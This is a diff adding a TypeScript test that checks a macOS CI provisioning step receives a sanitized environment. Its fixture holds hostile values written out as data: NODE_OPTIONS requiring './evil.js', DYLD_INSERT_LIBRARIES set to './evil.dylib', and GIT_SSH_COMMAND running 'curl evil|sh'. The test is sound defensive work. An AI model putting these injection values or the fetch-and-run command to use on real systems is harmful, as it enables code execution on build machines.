@@ -219,4 +219,54 @@ describe('createMacBareExecute — valid shim flows through', () => {
     expect(path.includes(checkoutBin)).toBe(false);
     expect(path.includes('node_modules/.bin')).toBe(false);
   });
+
+  it('hands provisionNodeMac a SANITIZED env, not the raw inherited runner env (codex round-5 [critical])', async () => {
+    const repoDir = tmp('mb-repo-');
+    writeFileSync(join(repoDir, 'package.json'), '{"name":"x"}\n');
+    const scratchDir = tmp('mb-scratch-');
+    const configPath = join(scratchDir, 'config.yml');
+    writeFileSync(configPath, 'manager: npm\nwork_dir: /orig\n');
+
+    // Provisioning spawns bare-name tar/codesign/xattr; a checkout-prepended PATH
+    // + an inherited NODE_OPTIONS/DYLD_* must not reach it.  checkoutRoots() reads
+    // the REAL process env, so the checkout has to be visible there.
+    const checkout = tmp('mb-checkout-');
+    const checkoutBin = join(checkout, 'bin');
+    mkdirSync(checkoutBin);
+    const savedWorkspace = process.env['GITHUB_WORKSPACE'];
+    process.env['GITHUB_WORKSPACE'] = checkout;
+
+    let provisionEnv: NodeJS.ProcessEnv | undefined;
+    try {
+      const exec = createMacBareExecute(
+        makeDeps({
+          env: {
+            PATH: `${checkoutBin}${delimiter}/usr/bin${delimiter}/bin`,
+            NODE_OPTIONS: '--require ./evil.js',
+            DYLD_INSERT_LIBRARIES: './evil.dylib',
+            GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
+            HOME: '/Users/runner',
+          },
+          provisionNodeMac: (async (inp: { env?: NodeJS.ProcessEnv }) => {
+            provisionEnv = inp.env;
+            return PROVISIONED;
+          }) as unknown as NonNullable<MacBareExecuteDeps['provisionNodeMac']>,
+        }),
+      );
+      await exec(makeInput({ repoDir, scratchDir, configPath }));
+    } finally {
+      if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
+      else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
+    }
+
+    expect(provisionEnv).toBeDefined();
+    const env = provisionEnv as NodeJS.ProcessEnv;
+    // dangerous loader/config selectors stripped before provisioning runs
+    expect(env['NODE_OPTIONS']).toBeUndefined();
+    expect(env['DYLD_INSERT_LIBRARIES']).toBeUndefined();
+    expect(env['GIT_SSH_COMMAND']).toBeUndefined();
+    // checkout bin dropped from PATH; system dirs kept; legit env survives
+    expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);
+    expect(env['HOME']).toBe('/Users/runner');
+  });
 });
